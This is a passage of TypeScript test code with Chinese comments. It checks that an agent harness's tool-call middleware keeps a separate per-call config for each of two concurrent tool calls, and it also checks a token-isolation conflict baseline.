    assert(/CONFLICT/.test(r4), '✓ 对照:无 token 走 ambient 过期基线 → 冲突(隔离来自 token 而非 ambient)')
    if ((ctl as any).exitScope) ctl.exitScope('scope-A')
    exitA?.()
  }

  // ===== CA 并发修复:wrapToolCall → coreExecTool 的 per-call config 通道(subagent M3 同款机制)=====
  {
    const { composeToolCall } = await import('../../harness/middleware')
    // 中间件:把 per-call 值(signal 标识)注入 ctx.callConfig(模拟 subagent 中间件)
    const mw = {
      name: 'probe',
      wrapToolCall: async (ctx: any, next: any) => {
        ctx.callConfig = { ...(ctx.callConfig ?? {}), __pgProbe: `call-${ctx.id}` }
        return next(ctx)
      },
    }
    const seen: string[] = []
    // 模拟 coreExecTool:从 ctx.callConfig 读(真实实现经 { configurable: ctx.callConfig } 透传到工具 fn)
    const core = async (ctx: any) => { seen.push(ctx.callConfig.__pgProbe); return { content: 'ok', status: 'done' as const } }
    const handler = composeToolCall([mw as any], core)
    // 并发两路(交错 await):各 ctx 独立,不互相覆盖(修前闭包单变量后写覆盖前写)
    await Promise.all([handler({ id: 'a', name: 't', args: {}, state: {} as any }), handler({ id: 'b', name: 't', args: {}, state: {} as any })])
    assert(seen.includes('call-a') && seen.includes('call-b'), '✓ per-call config 通道:并发工具各持独立 callConfig,不互相覆盖(M3 机制)')
  }
}
